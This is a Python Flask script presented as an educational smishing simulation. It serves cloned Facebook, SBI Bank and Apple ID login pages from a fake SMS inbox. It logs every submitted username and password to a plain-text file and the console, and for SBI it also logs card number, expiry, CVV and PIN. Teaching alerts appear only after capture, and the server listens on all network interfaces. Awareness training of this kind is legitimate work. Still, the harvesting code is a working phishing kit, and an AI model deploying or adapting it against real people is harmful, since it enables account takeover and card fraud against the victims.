#!/usr/bin/env python3
"""
Complete Smishing Simulation - 3 Different Portals
- Facebook Login
- SBI Bank (Login + Card Details)
- Apple ID Login
"""

from flask import Flask, request, render_template, session
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'educational-demo-secret-key'  # For session storage

# File to store captured credentials
CAPTURE_FILE = "captured_creds.txt"

def log_credentials(portal, username, password, extra_info=None):
    """Log captured credentials with timestamp and portal info"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] PORTAL: {portal}\n"
    log_entry += f"    → Username: {username}\n"
    log_entry += f"    → Password: {password}\n"
    
    if extra_info:
        for key, value in extra_info.items():
            log_entry += f"    → {key}: {value}\n"
    log_entry += "-" * 50 + "\n"
    
    with open(CAPTURE_FILE, "a", encoding='utf-8') as f:
        f.write(log_entry)
    
    print(f"\n[!] CREDENTIALS CAPTURED - {portal}")
    print(f"    → Username: {username}")
    print(f"    → Password: {password}")
    if extra_info:
        for key, value in extra_info.items():
            print(f"    → {key}: {value}")
    print("-" * 50)

@app.route('/')
def index():
    """LANDING PAGE: Show SMS inbox"""
    return render_template('sms_inbox.html')

@app.route('/fake-login')
def fake_login():
    """Route handler for different portals"""
    portal = request.args.get('portal', 'facebook')
    
    if portal == 'facebook':
        return render_template('facebook_clone.html')
    elif portal == 'sbi':
        return render_template('sbi_bank.html', step='login')
    elif portal == 'apple':
        return render_template('apple_id.html')
    else:
        return render_template('facebook_clone.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submissions"""
    portal = request.args.get('portal', 'facebook')
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    if username and password:
        if portal == 'facebook':
            log_credentials('FACEBOOK', username, password)
            # Make sure show_alert=True and alert_message is set!
            return render_template('facebook_clone.html', 
                                 show_alert=True,
                                 alert_message="🔍 RED FLAG: Check the URL! This is " + request.host + " - not facebook.com! Real Facebook never asks for login via SMS.",
                                 last_username=username,
                                 attack_type=request.args.get('type', 'default'))
        
        elif portal == 'apple':
            log_credentials('APPLE ID', username, password)
            return render_template('apple_id.html',
                                 show_alert=True,
                                 alert_message="🔍 RED FLAG: Apple never asks for password via SMS!",
                                 last_username=username)
        
        elif portal == 'sbi':
            # For SBI, store login in session and go to card details
            session['sbi_username'] = username
            session['sbi_password'] = password
            return render_template('sbi_bank.html', step='card', last_username=username)
    
    # Default error case
    return render_template('facebook_clone.html', error="Please enter both fields")

@app.route('/sbi-card', methods=['POST'])
def sbi_card():
    """Handle SBI card details submission"""
    card_number = request.form.get('card_number', '')
    card_expiry = request.form.get('card_expiry', '')
    card_cvv = request.form.get('card_cvv', '')
    card_pin = request.form.get('card_pin', '')
    
    # Get login details from session
    username = session.get('sbi_username', 'Unknown')
    password = session.get('sbi_password', 'Unknown')
    
    # Log all details
    log_credentials('SBI BANK', username, password, {
        'Card Number': card_number,
        'Expiry': card_expiry,
        'CVV': card_cvv,
        'PIN': card_pin
    })
    
    # Show alert and return to login
    return render_template('sbi_bank.html', 
                         step='login',
                         show_alert=True,
                         alert_message="🔍 RED FLAG: Real banks NEVER ask for PIN and CVV together!")

if __name__ == '__main__':
    print("=" * 60)
    print("COMPLETE SMISHING SIMULATION - 3 PORTALS")
    print("=" * 60)
    print("1. OPEN THIS URL in your browser:")
    print("   http://127.0.0.1:5000")
    print("\n2. You'll see SMS inbox with 3 messages:")
    print("   📦 FedEx → Facebook Login")
    print("   🏦 SBI Bank → Login + Card Details")
    print("   📱 Apple ID → Apple Login")
    print("\n3. Click any message to test")
    print("4. Watch credentials appear here!")
    print("\n📁 Credentials saved to: captured_creds.txt")
    print("=" * 60)
    app.run(debug=True, host='0.0.0.0', port=5000)